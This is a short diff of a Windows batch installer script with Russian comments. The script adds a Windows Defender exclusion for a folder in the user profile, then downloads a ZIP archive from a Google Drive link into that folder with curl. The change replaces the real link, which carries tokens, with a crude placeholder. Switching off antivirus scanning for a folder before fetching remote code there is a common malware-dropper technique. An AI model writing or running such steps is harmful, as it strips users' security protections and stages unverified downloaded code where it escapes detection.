@@ -29,7 +29,7 @@ echo [1/6] Скачивание ZIP-архива...
 powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\ansel'"
 
 :: Прямая ссылка на файл (замени на свою!)
-set "DOWNLOAD_LINK=https://drive.usercontent.google.com/download?id=10VTE17DJuxpvNETplOdUVkix9hrgDz9d&export=download&authuser=0&confirm=t&uuid=601aa327-a996-4007-b04b-e647e18ae16e&at=AIrpjvNXkmtbVL9PDKP0mGvPR0Cd:1738844054794"
+set "DOWNLOAD_LINK=googledicklink"
 set "ZIP_PATH=%USERPROFILE%\ansel\archive.zip"
 
 :: Скачивание ZIP через curl (прямая ссылка)
